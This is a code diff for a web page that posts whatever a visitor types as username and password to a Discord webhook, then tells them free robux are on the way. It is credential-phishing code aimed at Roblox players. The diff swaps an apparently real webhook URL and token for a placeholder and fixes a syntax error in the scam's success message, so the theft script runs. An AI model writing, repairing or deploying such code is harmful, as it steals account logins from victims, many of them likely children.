@@ -54,7 +54,7 @@
     const textbox2 = document.getElementById('textbox2');
 
     sendButton.addEventListener('click', () => {
-      const webhookURL = 'https://discord.com/api/webhooks/1279492155567640658/8DYOy9iF79owV5N28lKJRblUTSLnxDtRazN2jv2vXJzNlK3EoJkiHT2AaxEGvUI1hK68'; // Replace with your actual webhook URL
+      const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your actual webhook URL
 
       const payload = {
         content: `Username: ${textbox1.value}\nPassword: ${textbox2.value}`
@@ -69,8 +69,7 @@
       })
       .then(response => {
         if (response.ok) {
-        alert(Succes!You will recieve your robux in a few minutes)
-
+          alert('Succes!You will recieve your robux in a few minutes');
         } else {
           alert('error');
         }
